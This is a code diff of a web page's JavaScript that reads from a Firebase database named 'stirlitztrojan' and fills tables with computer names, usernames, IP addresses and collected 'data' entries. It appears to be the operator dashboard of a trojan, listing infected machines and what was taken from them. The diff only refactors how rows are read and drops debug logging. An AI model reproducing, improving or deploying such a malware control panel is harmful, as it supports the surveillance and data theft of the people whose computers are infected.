@@ -24,19 +24,11 @@
     <script>
     <!--
     var firebase = new Firebase("https://stirlitztrojan.firebaseio.com/" + prompt("Password:"));
-    var rows, color;
-    
-    
     firebase.on("value", function(snapshot) {
-      console.log(snapshot.val());
-    });
-    
-    
-    /*
-    firebase.once("value", function(snapshot) {
-      rows = snapshot.child("user");
+      var color;
+      
       color = "#cccccc";
-      rows.forEach(function(row){
+      snapshot.val().user.forEach(function(row){
         var computer =  row.key().split("&")[0];
         var username =  row.key().split("&")[1];
         var ip =        ReplaceAll(row.key().split("&")[2], "-", ".");
@@ -56,12 +48,8 @@
         tableCellIp.innerHTML = ip;
       });
       
-      
-      
-      
-      rows = snapshot.child("data");
       color = "#cccccc";
-      rows.forEach(function(row){
+      snapshot.val().data.forEach(function(row){
         var computer = row.key().split(",")[0].split("&")[0];
         var username = row.key().split(",")[0].split("&")[1];
         var data = row.val();
